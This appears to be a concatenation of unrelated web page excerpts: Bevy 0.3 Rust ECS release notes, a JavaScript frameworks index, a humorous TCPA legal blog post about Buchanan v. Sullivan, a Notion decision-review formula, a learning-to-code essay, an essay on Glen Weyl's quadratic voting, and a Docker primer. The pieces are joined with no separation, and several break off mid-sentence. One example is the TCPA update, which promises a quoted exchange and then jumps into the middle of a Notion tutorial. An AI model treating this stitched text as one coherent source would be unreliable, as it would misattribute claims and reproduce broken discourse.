<pre><code><span>fn </span><span>conflicting_query_system</span><span>(</span><span>mut </span><span>q0</span><span>: </span><span>Query</span><span>&lt;&amp;</span><span>mut</span><span> A</span><span>&gt;</span><span>, </span><span>mut </span><span>q1</span><span>: </span><span>Query</span><span>&lt;(&amp;</span><span>mut</span><span> A, </span><span>&amp;</span><span>B</span><span>)&gt;) {
    </span><span>let</span><span> a </span><span>=</span><span> q0</span><span>.</span><span>get_mut</span><span>(</span><span>some_entity</span><span>).</span><span>unwrap</span><span>();
    </span><span>let </span><span>(</span><span>another_a</span><span>,</span><span> b</span><span>) =</span><span> q1</span><span>.</span><span>get_mut</span><span>(</span><span>some_entity</span><span>).</span><span>unwrap</span><span>();
    </span><span>// Aaah!!! We have two mutable references to some_entity's A component!
    // Very unsafe!
</span><span>}
</span></code></pre>
<p>The locks ensured that the second <code>q1.get_mut(some_entity)</code> access panicked, keeping us nice and safe. In <strong>Bevy 0.3</strong>, a system like <code>conflicting_query_system</code> will fail when the schedule is constructed. By default, <em>systems cannot have conflicting queries</em>.</p>
<p>However there are some cases where a system <em>needs</em> conflicting queries to do what it needs to do. For these cases, we added <code>QuerySets</code>: </p>
<pre><code><span>fn </span><span>system</span><span>(</span><span>mut </span><span>queries</span><span>: </span><span>QuerySet</span><span>&lt;(</span><span>Query</span><span>&lt;&amp;</span><span>mut</span><span> A</span><span>&gt;</span><span>, Query</span><span>&lt;(&amp;</span><span>mut</span><span> A, </span><span>&amp;</span><span>B</span><span>)&gt;)&gt;) {
    </span><span>for</span><span> a </span><span>in</span><span> queries</span><span>.</span><span>q0_mut</span><span>().</span><span>iter_mut</span><span>() {
    }

    </span><span>for </span><span>(</span><span>a</span><span>,</span><span> b</span><span>) in</span><span> queries</span><span>.</span><span>q1_mut</span><span>().</span><span>iter_mut</span><span>() {
    }
}
</span></code></pre>
<p>By putting our conflicting <code>Queries</code> in a <code>QuerySet</code>, the Rust borrow checker protects us from unsafe query accesses.</p>
<p>Because of this, we were able to remove <em>all</em> safety checks from <code>query.iter()</code> and <code>query.get(entity)</code>, which means these methods are now <em>exactly</em> as fast as their <code>World</code> counterparts (which we made lock-free in Bevy 0.2). </p>
<h3 id="performance-improvements">Performance Improvements</h3>
<p>Bevy had a number of nice performance improvements this release:</p>
<ul>
<li>Removed atomic locks from Query access, making Bevy ECS 100% lock free</li>
<li>Removed archetype "safety checks" from Query access. At this point we have already verified …</li></ul></div></div>

<p>The programming industry is conservative, which means, if a framework gets popular, the industry will stick to it for a time, especially in the front end matter.</p>
<p>The holy trinity of the javascript frameworks is since some time ago React, Angular, Vue, Express, and Mongoose for the backend. But people tend to think they are “silver bullet” stuff. So today in “things that I probably shouldn’t do because I have work to do”:</p>
<h2>Documenting 6 not so popular javascript frameworks in 30 days</h2>
<p>So here is the plan, I will make a public repository containing 6 different javascript frameworks and I will document when and when not to use them, their advantages, tradeoffs, etc.</p>
<p>Here is the list of frameworks that I will try:</p>
<p>Note: A framework and a library are different things, but I will use both of them in the list, and they are not tied to front or backend, they are just related to web development</p>
<h3>The list</h3>
<ul><li><strong><a href="https://svelte.dev/" target="_blank" rel="noopener">Svelte</a></strong> The “Write less code” framework =&gt; <a href="https://pixo.sh/6-javascript-frameworks-in-30-days-svelte-framework/">Svelte post here</a></li><li><strong><a href="https://nextjs.org/" target="_blank" rel="noopener">Next.js</a></strong> The “cocaine for web devs” framework  (<a aria-label="did a starter for this already (opens in a new tab)" rel="noreferrer noopener" href="https://pixo.sh/nextjs-typescript-tailwind-guide/" target="_blank">did a starter for this already</a>)</li><li><strong><a href="https://strapi.io/" target="_blank" rel="noopener">Strapi</a></strong> The “wordpress.js” framework</li><li><strong><a href="https://aurelia.io/" target="_blank" rel="noopener">Aurelia</a></strong>  The “reactive and high performance” framework</li><li><strong><a href="https://www.fastify.io/" target="_blank" rel="noopener">Fastify</a></strong> The “performant in the darkness” framework (I don’t know why this one is not so popular)</li><li><strong><a href="https://preactjs.com/" target="_blank" rel="noopener">Preact</a></strong> The “minified React” framework/library</li></ul>
<p>This post will act as an index, I will update it every time I try a new framework and all the code is <a href="https://github.com/PixoDev/6-frameworks-30-days" target="_blank" aria-label="available on github (opens in a new tab)" rel="noreferrer noopener">available on GitHub</a></p>

		<p><em>Editor’s Note: Welcome Hackers! Not sure how Hacker News found this article but I see a ton of folks headed in from that website, which I presume is some sort of aggregator for news articles of interest to folks that like to hack stuff. Feel free to have a look around the website–<a href="https://tcpaworld.com/podcast/">check out our cool podcast</a>–and tell any friends that might like this nerdy stuff. But don’t hack anything please. Thanks.&nbsp;</em></p>
<p>Since there is absolutely nothing else going on today I figured I’d share one of the weirdest TCPA cases I’ve seen recently.</p>
<p>So apparently some guy in Nebraska named Mort who really doesn’t like a gas station called Bucky’s Gas Station. He hates it so much, in fact, that he has created a stark raving mad loony-toons (my opinion) gripes board on the internet to assail it. You can visit it, if you’d like, but be warned that your brain will melt a little: <a href="http://www.buckysgasstationsucks.com/">www.buckysgasstationsucks.com</a>.</p>
<p>I spent more time than I’d care to admit reviewing the website last night but I can’t quite figure out where the beef originated. (If you can figure it out let me know, as I am actually genuinely curious.)</p>
<p>So Bucky’s Gas Station is owned by a guy named Buchanan— who I will assume goes by Bucky whether he wants to or not—and his wife who have allegedly been subjected to years of abuse at the hands of Mort using something called a FaxTel 2000, which is something directly out of a 90s era Simpsons. Apparently Mort revs up his FaxTel 2000 and blasts Bucky and his wife with unwanted messages from time to time, just to make sure Bucky remembers how much Mort dislikes him.</p>
<p>Not stopping there, Mort also—allegedly—encourages members of the public to blast poor Bucky with calls “day and night” and to do the same with his associates and neighbors, many of whose contact information is listed on the brain-melting website. As the order tersely words it: “<em>[Mort] encourages members of the public to contact the Buchanans, their neighbors, and others they are affiliated with; and notes that the Buchanans and others will be contacted daily and nightly regarding Sullivan’s grievances</em>.”</p>
<p>Since I don’t actually know why Mort is so agitated by Bucky I can’t say that his conduct is totally inappropriate. I mean, maybe Bucky threw Mort’s puppy in a microwave or something. But either way the conduct of blasting someone’s cell phone with unwanted messages is illegal—if an ATDS is used.</p>
<p>And here’s where things finally get interesting in this yawner of a case.</p>
<p>The Plaintiff alleged that FaxTel 2000 is an autodialer because, I mean, look at the thing.</p>

<p>But Mort had a clever response—this device is so old and beaten up that it can no longer dial randomly and sequentially, plus no replacement parts are available so it lacks the capacity to dial that way in the future either. So it can’t possibly meet the TCPA’s ATDS definition.</p>
<p>I mean, its kind of a brilliant argument if you think about it (and your mind has melted a little.)</p>
<p>Unfortunately for Mort, however, the case was decided at the pleadings stage and the Court simply could not accept Mort’s assertions on the FaxTel’s dialing capacity as those “facts” were outside the pleadings. Instead the Court had to accept Bucky’s claim that the dialer had all the needed functionality to behave as an ATDS.</p>
<p>Undeterred, Mort also argued that the TCPA infringed on his First Amendment rights but—as <strong><a href="https://tcpaworld.com/2020/10/29/happy-halloween-tcpaworld-heres-are-the-top-10-scariest-tcpa-stories-going-to-freak-you-out-this-halloween/">readers of my Halloween column know</a></strong>—the Constitution won’t save you in TCPAWorld.</p>
<p>*Insert left-over evil laugh from Halloween bargain bin here*</p>
<p>Mort finished his motion to dismiss with a claim that the TCPA only applies to telemarketing harassment, not good-ole-fashioned harassment harassment. No dice. The Court looks at the words of the statute and cannot find the “I just want to abuse people out of spite” TCPA exemption.</p>
<p>On the other hand, and somewhat amusingly, the Court refused to enter a preliminary injunction prohibiting Mort’s conduct finding that it wanted more information and evidence before doing so. Under the circumstances of this case one might have thought ordering one party to temporarily stop blasting the other with&nbsp; robocalls would have been pretty perfunctory. But I guess the Court also wants to know about the condition of Mort’s puppies before ordering him to stop FaxTeling Bucky.</p>
<p>The case is <em>Buchanan v. Sullivan</em>, 8:20-CV-301, 2020 U.S. Dist. LEXIS 202519 (D. Ne. October 30, 2020).</p>
<p>And now you may return to your low-anxiety and worry free Tuesday.</p>
<p>Hey, look at that bird outside.</p>
<p><strong>UPDATE: 11/3/2020 at 2:24 pm pacific</strong></p>
<p>So I apparently have a new team of hackers that work for me– Czar of TCPAWorld and Czar of the Hackers?– and they think they’ve uncovered what happened here. Below is an exchange from a hacker news message board, because that’s how I roll now:</p>

It's so easy to overlook this part but reflecting on past decisions will improve your decision making 10x (don't @ me). Anyway,  I built a three properties that help with facilitating this behavior:</span></span></p><p><span><span>Firstly, </span><span><code>Review in</code></span><span>, a single choice label for the duration of weeks or months after which you want to review your decision. Parrish recommended six months as the default time frame but I thought that was too constrained, so I expanded it to one week, two weeks, one month, three month and six months. Below I will explain how you can add your own .</span></span></p><p><span><span>Secondly, I find unnecessarily annoying to add the dates and figure out where you need to set the reminder, so I wrote the </span><span><code>Review at</code></span><span> formula. It's a bunch of nested IF statements that look at </span><span><code>Review in</code></span><span> and add the corresponding timeframe to </span><span><code>Created at</code></span><span>. It looks like this:</span></span></p><pre id="2ed841786e93444cb3aeb16bcea725e5"><code><span><pre><code><span>if</span><span>(</span><span>prop</span><span>(</span><span>"Review in"</span><span>)</span><span> </span><span>==</span><span> </span><span>"One week"</span><span>,</span><span> </span><span>format</span><span>(</span><span>dateAdd</span><span>(</span><span>prop</span><span>(</span><span>"Made at"</span><span>)</span><span>,</span><span> </span><span>1</span><span>,</span><span> </span><span>"weeks"</span><span>)</span><span>)</span><span>,</span><span> </span><span>if</span><span>(</span><span>prop</span><span>(</span><span>"Review in"</span><span>)</span><span> </span><span>==</span><span> </span><span>"Two weeks"</span><span>,</span><span> </span><span>format</span><span>(</span><span>dateAdd</span><span>(</span><span>prop</span><span>(</span><span>"Made at"</span><span>)</span><span>,</span><span> </span><span>2</span><span>,</span><span> </span><span>"weeks"</span><span>)</span><span>)</span><span>,</span><span> </span><span>if</span><span>(</span><span>prop</span><span>(</span><span>"Review in"</span><span>)</span><span> </span><span>==</span><span> </span><span>"One month"</span><span>,</span><span> </span><span>format</span><span>(</span><span>dateAdd</span><span>(</span><span>prop</span><span>(</span><span>"Made at"</span><span>)</span><span>,</span><span> </span><span>1</span><span>,</span><span> </span><span>"months"</span><span>)</span><span>)</span><span>,</span><span> </span><span>if</span><span>(</span><span>prop</span><span>(</span><span>"Review in"</span><span>)</span><span> </span><span>==</span><span> </span><span>"Three months"</span><span>,</span><span> </span><span>format</span><span>(</span><span>dateAdd</span><span>(</span><span>prop</span><span>(</span><span>"Made at"</span><span>)</span><span>,</span><span> </span><span>3</span><span>,</span><span> </span><span>"months"</span><span>)</span><span>)</span><span>,</span><span> </span><span>if</span><span>(</span><span>prop</span><span>(</span><span>"Review in"</span><span>)</span><span> </span><span>==</span><span> </span><span>"Six months"</span><span>,</span><span> </span><span>format</span><span>(</span><span>dateAdd</span><span>(</span><span>prop</span><span>(</span><span>"Made at"</span><span>)</span><span>,</span><span> </span><span>6</span><span>,</span><span> </span><span>"months"</span><span>)</span><span>)</span><span>,</span><span> </span><span>"Decision has not been made yet"</span><span>)</span><span>)</span><span>)</span><span>)</span><span>)</span></code></pre></span></code></pre><div id="8defbfbe696d40628a3b56bc53b88a33"><p><span><span>Right now, you can only compute one result in </span><span><code>Review at</code></span><span> that's why </span><span><code>Review in</code></span><span> is single choice.

                <div>
                    <p>Two months ago, I started learning how to code. I’ve approached coding three times in the past seven years and always quit. This time, I decided to figure out <a href="https://vasilishynkarenka.com/learning/">how to learn</a> first and gave myself a word to not stop until I can make a simple web app myself.</p><p>Last week, I finished my first <a href="https://vasilishynkarenka.com/gpt-3/">useful React app</a> and decided to reflect on what I’ve learned in the past two months. I’ve seen many articles describing tips and tricks for studying coding, but very few cover the process of learning and the psychology behind it.</p><p>In summary, you need to build a habit of learning, find what you’re obsessed with, and crawl your way through The Suck. I also explain how drawing and spatial cognition help improve understanding, how you can enhance transfer by creating more hooks for recall, and how to design an environment for concentration instead of pushing yourself to focus.</p><p><em>P.s. If you aren’t learning to code, you’ll benefit from reading the habit part as well – the principles behind it apply to any routine.</em></p><p><em>P.p.s. If you haven’t seen my work on learning, I’d recommend reading both posts so that you form a complete picture of how to learn:</em></p><figure><a href="https://vasilishynkarenka.com/learning/"><div><p>How to remember what you learn</p><p>Make it time-based, apply metacognition &amp; active recall, and learn what you’re curious about.</p><p><img src="https://vasilishynkarenka.com/favicon.png"><span>Vasili Shynkarenka</span></p></div><p><img src="https://vasilishynkarenka.com/content/images/2020/09/IMG_1517.jpg"></p></a></figure><hr><p>Most people quit learning to code because they don’t get results. But results come after months of practice – there is no way to become a senior engineer after one hour of HTML tutorials. To get there, you can’t rely on fragile motivation that fades away quickly. You must build a habit of learning.</p><p>To build a habit, you need four things:</p><ol><li>Design your intention.</li><li>Make learning time-based instead of outcome-based.</li><li>Start small.</li><li>Do not make up for missed studies.</li></ol><h2 id="design-your-intention">Design your intention</h2><p>Most people never study because they don’t specify when and where learning will happen. They just keep snoozing it because “today was really busy but let’s see if I can make it tomorrow.” And tomorrow never comes.</p><p>Intention design is a trick to help with indefinite plans. When you want to do something, write it down in the following structure:</p><blockquote><em>“I, Vasili Shynkarenka, will study React course on Scrimba from 8:00 to 8:30 am tomorrow morning in my study room, right after I brush my teeth.” (Signature)</em></blockquote><p>Here’s why it works.</p><p><strong>First, you give yourself a word.</strong> When you promise yourself in writing that you will do something, you plant a seed for consistency. And humans naturally want to be consistent in their actions to not look stupid. But consistency works only if the action is present. And when you’re merely thinking about doing something, that’s not real yet. When you write the thing down, you make it real.</p><p><strong>Second, you get clarity.</strong> Suppose you omit essential details, such as where you will be studying or which material you will use. In that case, you’re less likely to do it because you will experience increased cognitive load at the moment. Because humans don’t like thinking, you will go for the easiest option possible – to put it off.</p><p>That’s why Eisenhower famously said that while plans are useless, planning is essential. The act of planning clarifies subtleties. Your plan may change, but clarity will lower cognitive load and increase the likelihood of taking action.</p><p><strong>Third, you specify the behavior after which learning should begin.</strong> Very often, our plans go sideways because we do not clarify <em>when</em> we will do the thing. Urgent stuff keeps popping up, and we never get to do what we wanted.</p><p>The easiest solution here is to choose a trigger that you already do every day, no matter what, and schedule your learning right after that act. Brushing your teeth, having breakfast, coming back home after work – all are excellent examples. If you approach intention design that way, you have less opportunity for failure because the “must-do” thing will always be there and serve as a reminder for the action you want to take.</p><h2 id="make-learning-time-based">Make learning time-based</h2><p>If you choose to study until you finish the chapter, you incentivize yourself to optimize for speed rather than understanding. As a result, you will skim the most valuable parts to hit your goal.</p><p>The second problem with goals like “finish such and such tutorial” is that you will underestimate how much time it will take to finish the thing. And when you run out of time, you will be frustrated with yourself because you didn’t hit your goal.</p><p>Instead, set time-based goals. “Study JS course for 1h” is a good example. Or “Read new CSS tutorial for 30 min”. </p><p>When you switch to time-based learning, three things happen:</p><p><strong>First, you take control of whether you succeed or not.</strong> When you are focused on the outcome, you have to rely on an unknown variable – how much time it will take for you to understand something new. This often leads to self-hatred – you will blame yourself for being stupid because you didn’t understand the material quickly. But if you focus on time, then you always succeed if you want to. You just need to focus.</p><p><strong>Second, you can fit the learning session into your busy schedule.</strong> When you know that you’ll be learning for thirty minutes no matter what, you know where to put the thing.</p><p><strong>Third, you build self-confidence.</strong> The time you spend on learning is a continuum, but the act of showing up is binary. It doesn’t care for how long you learn to mark it as “done.” And if you keep showing up for months, you become <em>the type of person</em> who shows up. And as most people quit in the first few months, you’ll have built immunity by the moment you will face The Suck.</p><h2 id="start-small">Start small</h2><p>When you’re just getting started, lower the time of your studies to a bare minimum. Make it negligible. Even ten minutes will do, given that you’re doing it every day.</p><p>I hear you saying: “How can I possibly learn something really complex as coding by spending ten minutes a day on it?” You can’t. But you can build discipline.</p><p>Also, you’ll procrastinate less. If you only have ten minutes to learn in a day, and there’s no opportunity to make up for it, your mind will be like: “Hell, I’ve got only ten minutes today – I better focus and not scroll Instagram.”</p><h2 id="do-not-make-up">Do not make up</h2><p>You must never, ever, make up for studies that you missed. </p><p>It’s incredibly easy to sell yourself on the idea that “Oh, I don’t really want to study this morning, I’ll do it later today when I have time.” </p><p>But snoozing is dangerous for two reasons:</p><ol><li>First, you’re unlikely to do it later because you won’t have triggers to remember the thing. You screw up your intention design.</li><li>Second, you set up bad incentives for yourself in the future. There will be moments when your habit will fail you and you will skip learning. And if you’ve trained yourself to snooze things for later when any inconvenience arises, you’ll tend to do it over and over again. You’ll just keep snoozing.</li></ol><p>So what do you do if you miss a session? Nothing. You don’t reschedule. You don’t blame yourself. It’s already in the past, so there’s no reason to do any of these things. You show up again tomorrow and do the work.</p><p>When you stop rescheduling, you become less likely to skip your learning sessions because you know you can’t make up for it. Your mind will remember the contract you have agreed on and stop offering opportunities for sloth.</p><p>After you make learning a habit, the next question is how to get more of it. That’s because learning is nonlinear: if you put in two hours every day instead of one, you don’t get a 2x outcome – you get 5-10x. </p><p>The best way to allocate more time to coding is not to squeeze more hours of study but to discover your obsession. </p><p>Obsession is a multiplier for results. When you’re obsessed with something, you cannot <em>not</em> do the thing. As a result, you don’t have to decide each time whether to study or not. You just do it.</p><p>I’m obsessed with building interfaces. I don’t really care about how beautiful the app’s architecture is or what algorithm we use for compression. All I’m thinking about is how to make the user experience great.</p><p>When I realized that interfaces make me tick, I optimized my learning program to build more of them. I created all sorts of forms, confirmation alerts, and buttons. I stopped counting minutes I had yet to study and began going way <em>beyond</em> what I initially allocated for learning just because I was so curious about it. And that’s where real progress began to happen.</p><p>To find what you’re obsessed with, ask yourself two questions:</p><ol><li>Why do I want to learn how to code in the first place?</li><li>Is there anything specific about coding that drives me?</li></ol><p>If you don’t have an answer now, it’s okay. Try many things broadly to find what makes you tick about coding, and then double down in that direction. If data is your thing, go ahead and study APIs first. If you sweat when you make beautiful CSS animations, go and pick up that. Follow your own obsession.</p><figure><img src="https://vasilishynkarenka.com/content/images/2020/10/image-7.png" alt="" srcset="https://vasilishynkarenka.com/content/images/size/w600/2020/10/image-7.png 600w, https://vasilishynkarenka.com/content/images/2020/10/image-7.png 790w" sizes="(min-width: 720px) 720px"><figcaption>"Andy crawled to freedom through five-hundred yards of shit smelling foulness I can't even imagine, or maybe I just don't want to. Five-Hundred yards... that's the length of five football fields, just shy of half a mile."</figcaption></figure><p>Everyone who learns something complex goes through The Suck.</p><p>That’s when things get tough. When you don’t see progress for weeks. When you wake up every day and question yourself if it’s worth it. When you are ready to quit. The difference between people who end up learning how to code and those who don’t is simple – those who succeed somehow manage to crawl their way through The Suck.</p><p>Because I knew how learning works, I was aware The Suck is coming. But it hit me hard anyway. To help you get through The Suck, I’ve documented what I did to pull myself from that shithole.</p><h2 id="understand-how-learning-works">Understand how learning works</h2><p>Learning is never linear and more like a giant exponential curve.

<p>“The nineteenth-century liberal was a radical, both in the etymological sense of going to the root of the matter, and in the political sense of favoring major changes in social institutions. So too must be his modern heir.”</p>
</blockquote>
<p>In this essay, we will be focusing on the work of political economist and social technologist <strong>Glen Weyl</strong>, co-author of the 2018 book <em>Radical Markets: Uprooting Capitalism and Democracy for a Just Society</em>, whose fame, or the general recognition he enjoys, is difficult to gauge. Even though he is only followed on Twitter by a little over 17.000 accounts, his ideas are thought to have accumulated billions of dollars of capital used to finance various projects discussed in the aforementioned book, as well as <a href="https://lawreview.uchicago.edu/publication/radicalxchange-academic-agenda">those</a> Weyl is currently part of. “[P]robably a hundred start-ups have formed or pivoted around ideas from the book. About half of this activity is within the blockchain space, but much of it stretches well beyond.”</p>
<p>Enjoying immediate critical acclaim and a deluge of reviews heaping praise onto the novel concepts in the field of political economy, Weyl formed a non-profit organization called RadicalxChange, which is essentially a global initiative currently comprised of 67 chapters aiming to advance from off the pages and screens into the collective imaginary and eventually into the institutional sphere. 2020 serves exceedingly well to demonstrate how changes in this domain are more than welcome. In his own <a href="https://blog.radicalxchange.org/blog/posts/2019-12-30-gqx4th/">words</a>: “The RxC movement is a community of artists, researchers, entrepreneurs and activists working to imagine, design, experiment with, and execute political changes based on radically innovative political economies and social technologies that are truer to the richness of our diversely shared lives.”</p>
<p>Weyl, together with <strong>Vitalik Buterin</strong> and <strong>Zoë Hitzig</strong>, is using this movement to promote a new postpolitical identity called liberal radicalism. Among the currently available alternatives waiting like hungry hyenas for neoliberalism to finally die out and aiming to revitalize liberal values after entering into the new multipolar world––metamodernism as well as <a href="https://cybertrophic.wordpress.com/2020/04/13/post-liberals-meta-liberals-towards-an-exit-oriented-politics/">metaliberalism</a> and <a href="https://palladiummag.com/2018/09/29/towards-the-post-liberal-synthesis/">postliberalism</a>––this position is certainly the most democratic and decentralized. Radical liberalism as a concept is actually based on the radical liberals of the 19<sup>th</sup> century, especially <strong>Henry George</strong> whose works were widely read at the time, but more on that later. For now, suffice it to say that liberal radicalism is an attempt at transforming market dynamics and democratic governance so that they could combine fast, dynamic capitalism with the public character of democracy as well as its insistence on the common good.</p>
<p>What I want to say is that the economic theory in use today is still the one based on marginal revolution of the late-19<sup>th</sup> century and its insights. That means that it is not fit for sound valuation of public goods, whose importance has been on the increase for a while, or other increasing returns which, despite being exchanged, are <a href="https://www.youtube.com/watch?v=8TwNNgiNZ7Y&amp;list=PLXu14EPQiycXXMirR66mbdw2zr0bsOlDR&amp;index=23&amp;t=350s">inexhaustible</a> since they remain in possession of two or more people even after being <a href="https://medium.com/@glenweyl/a-radicalxchange-between-vitalik-buterin-and-glen-weyl-328d8ad088cf">exchanged</a>: “Basically, LR [liberal radicalism, op. a.] highlight how bankrupt current economic discourse with its extreme individualist focus is. This is not just how social life is organized; we live in societies where almost everything is produced by some at least partially increasing returns technology and economics takes as the basic starting point a totally individualist perspective that only works for decreasing returns stuff and when confronted with increasing returns has to treat it with market power or other awfully inefficient kludges.” A classic example of an increasing return is the contemporary platform economy in which serviceability, efficiency, and thus the value of social media disproportionately increases (as opposed to decreases) with each new user.</p>
<p>The heart of the matter therefore lies in the fact that private property as it is understood now does not correctly reflect the value created publicly in contemporary economies. Whereas an individual’s marginal contribution to such an economic scheme is negligeable, it is the shared bond among them that produces immeasurable value, which is left unaddressed in this scheme. One is, for this reason, hardly surprised by emerging internet monopolies, nor by the perseverance of dogmatic belief into private property and, by consequence, deterioration of public goods. Or, of course, the rise of dystopian scenarios in which we could be faced with voting not for <strong>Kanye West</strong> but rather for one of the key members of the increasingly antidemocratic Silicon Valley technocracy club. Let us see what Weyl has to <a href="https://blog.radicalxchange.org/blog/posts/2019-12-30-gqx4th/">say</a> on the matter: “The basic problem is that capitalism is based on the principle that every contributor should be paid her marginal contribution. Yet the key feature of increasing returns is that everyone together achieves much more than all can achieve individually. This implies that everyone’s marginal contribution, once all others are participating, is far greater than her proportional share of the total produced. In such situations, capitalism simply outputs an error.” <strong>Hence, our current economic theory is unable to address the civilization dynamic, that is to say, the increasing returns dynamic <em>par excellence</em>.</strong></p>
<p>Allow me to recapitulate what has been hitherto discussed and set the stage for what is to come, namely a more detailed analysis of a new postpolitical identity. Weyl is set on conceiving a new kind of political philosophy able to successfully address increasing returns without walking into the trap of decreasing ones. Here is a quote from the programmatic text “The Political Philosophy of RadicalxChange”: “A central goal of any effort to build a new political philosophy or fresh paradigm for political economy should be to lay out approaches to markets, governance, and community that capture the benefits of increasing returns without falling into the traps that increasing returns phenomena can generate.” In light of this, Weyl became a night-mode economist, an economist-engineer who conceived through mechanism design theory concepts of mathematical logic that are going to radically alter the economic and political components of liberalism and thus redistribute wealth and relaunch economic growth. These concepts are called QV (quadratic voting), QF (quadratic financing), and COST (common ownership self-assessed tax).</p>
<h2 id="quadratic-voting-and-quadratic-financing">Quadratic voting and quadratic financing</h2>
<p>The point of departure of Weyl’s project can be traced back to its very name: in mathematics, ‘radical’ is synonymous with the square root of something. Together with <strong>Eric Posner</strong>, Weyl wrote in _Radical Markets _that “The square root is also known as the ‘radical’, hence ‘radical democracy’ – which is a kind of Radical Market, except it is one in which the goods are public rather than private.” Bringing this project to fruition requires a change in the relationship between the private and the public goods. This can be done in accordance with Nobel laureate in economy and father of mechanism design <strong>William Vickrey’s</strong> maxim: “Each individual must pay an amount equal to the cost that her actions impose on others.” The common good is not based in philanthropy, but rather in reciprocity. This part discusses the mechanisms of optimal allocation and financing of public goods, and the next presents the new ways of how private property can be used to finance public goods.</p>
<p>We are faced with two tasks. The first one is to avoid the well-known pitfalls of public goods, namely the so-called tragedy of the commons and the free-rider problem. The second one is to protect public goods from pauperization and from being stolen for private gain. Let us begin with the solution to the first problem, which was suggested by Weyl and Posner in the aforementioned work: quadratic voting. It is a mechanism based on an optimal balance of an individual’s influence on society and the price they have to pay for it. The central feature of quadratic voting, or scaling, is that when votes are cast, every additional unit needs to be proportionally taxed: “What’s important is not so much the total cost of each number of votes, but that the marginal cost of casting the next vote grows proportionally to the number of votes cast.”</p>
<p>Quadratic voting is presented as a way out of such voting systems as ‘one dollar one vote’ or ‘one person one vote’ since it, as opposed to those two, is designed to keep the balance between valuation and influence linear. In his essay “Quadratic Payments: A Primer”, Buterin voices his opinion on the matter: “Notice that only quadratic voting has this nice property that the amount of influence you purchase is proportional to how much you care; the other two mechanisms either over-privilege concentrated interests or over-privilege diffuse interests.” The one-dollar-one-vote system will always result in the most fervent or the most affluent option winning since the price of a vote will remain the same regardless of how many of them are bought; the one-person-one-vote system will always result in a practically indifferent majority overruling the fervent, passionate minority by outweighing its interests to the point that they are neglected. Quadratic voting, on the other hand, allows an individual to cast multiple votes/tokens, but in such a way that every further vote is disproportionately costlier than the previous one: it follows the quadratic or radical function of <em>n</em>. Thus, 1 vote costs 1 token, 2 votes cost 4 tokens, 20 votes cost 400 tokens, etc.</p>
<p>However, the crucial component of Weyl’s project is not quadratic voting but quadratic financing. He, together with Buterin and Hitzig, conceived in their essay “Liberal Radicalism: A Flexible Design for Philanthropic Matching Funds” which is as of yet their most theoretically sound work, a completely decentralized and non-predetermined mechanism for noting an individual’s …</p></div></div></div></div></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>
  I've been exposed to docker on and off and every time I see it, I seem to need a refresher. In this article we will go
  through everything you need to know about Docker in order to either jump into an existing project or get started with
  it.
</p>

<h5>Basic concepts</h5>

<p>
  Docker is basically a system of running processes on the host machine in an isolated way, using several Linux kernel
  features. Thus, Docker is more lightweight than a full-blown virtual machine. The disadvantage of a Docker container
  vs. a virtual machine is that multiple containers share the same underlying OS kernel. While the concept of jailed
  processes is not new, Docker's popularity was essentially due to the tooling that it provided to which made it really
  straightforward to spin up and manage containers.
</p>

<p>
  Docker is made up of various components. The main component is the the docker engine, which consists of a lightweight
  runtime that manages containers, images, builds, and more. It runs natively on Linux systems and is made up of:
</p>

<ol>
  <li>Docker daemon that runs on the host machine.</li>
  <li>Docker client that communicates with the Docker daemon to execute commands.</li>
  <li>A REST API for interacting with the Docker daemon remotely.</li>
</ol>

<p>
  The Docker client is what you, as the end-user use to communicate with the Docker daemon, e.g.
  <code>docker run hello-world</code>.
</p>

<p>
  The Docker daemon is what actually executes commands like building and running containers on the host machine. The
  Docker Client can run on the same machine as well, but it does not have to. It can also communicate with the Docker
  Daemon running on a different host.
</p>

<p>We will look at other Docker components like the Docker hub, etc. later in this article.</p>

<h5>Images, containers and volumes</h5>

<p>
  A Docker image can be though of as a recipe for setting up a machine with all required software and dependencies
  installed. Apart from installing software, images can also define what processes to run when launched. Docker images
  are created via instructions written in a <code>Dockerfile</code>. Images are built on the concept of layers. There is
  always a base layer, potentially followed by additional layers that represent file changes. Each layer is stacked on
  top of the others, consisting of the differences between it and the previous layer. This is achieved via a
  <a href="https://en.wikipedia.org/wiki/UnionFS">Union file system</a>.
</p>

<!--
<p>Examples of instructions one can put into a <code>Dockerfile</code>:</p>

<ul>
  <li><code>RUN apt-get -y install some-package</code> # install a software package</li>
  <li><code>EXPOSE 8000</code> # expose a port</li>
  <li><code>ENV ANT_HOME /usr/local/apache-ant</code> # pass an environment variable</li>
</ul>
-->

<p>
  A Docker container is the running instance of an image. This includes the operating system, application code, runtime,
  system tools, system libraries, etc. A Docker image can be thought of as an executable and a container can be thought
  of as the running application. Note that in this analogy each running application is its own instance and independent
  of the others.
</p>

<p>
  The general idea is that once you have successfully created a container, you can then run it in any environment
  without having to make changes.
</p>

<p>
  A Docker volume is the "data" part of a container, initialized when a container is created. Volumes allow
  you to persist and share a container's data. Docker volumes are separate from the default Union File System and exist
  as normal directories and files on the host filesystem.
</p>

<h5>Docker comands</h5>

<p>
  As part of the docker installation process, a hello world image was downloaded and executed via:
  <code>docker run hello-world</code>
</p>

<p>List all images with <code>docker images</code>:</p>

<pre>$ docker images
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
ubuntu              latest              94e814e2efa8        2 weeks ago         88.9MB
hello-world         latest              fce289e99eb9        2 months ago        1.84kB
</pre>

<p>Run a command interactively from an image in a new container: <code>docker run -it ubuntu bash</code></p>

<p>
  List all running containers: <code>docker ps</code>. To list all previously run containers use
  <code>docker ps -a</code>:
</p>

<pre>$ docker ps -a
CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS                         PORTS               NAMES
d2d651741317        ubuntu              "bash"              45 minutes ago      Exited (0) 43 minutes ago                          suspicious_kalam
36813bdb6434        ubuntu              "bash"              About an hour ago   Exited (0) About an hour ago                       inspiring_banach
46f352a0cde9        hello-world         "/hello"            2 hours ago         Exited (0) 2 hours ago                             thirsty_clarke
</pre>

<p>
  Note that in the output above, for each docker <code>run</code> command, a new container was created. As mentioned
  previously, each container has it's own data volume and changes to one do not affect the others. To run an existing
  container: <code>docker run [container-name</code>. This will start the container and
  <code>docker attach [container-name]</code> will jump into it.
</p>

<p>
  At this point, you should have enough to get started with an existing docker project. Read on if you're looking to
  develop with docker.
</p>

<h5>Custom images</h5>

<p>
  As noted previously, Docker images are specified via a <code>Dockerfile</code>. Here's an extremely basic example that
  uses a ubuntu base image and copies an executable called <code>sysinfo</code> from the current directory into the
  container and executes it:
</p>

<pre>FROM ubuntu:18.04
COPY sysinfo /
CMD ["/sysinfo"]
</pre>

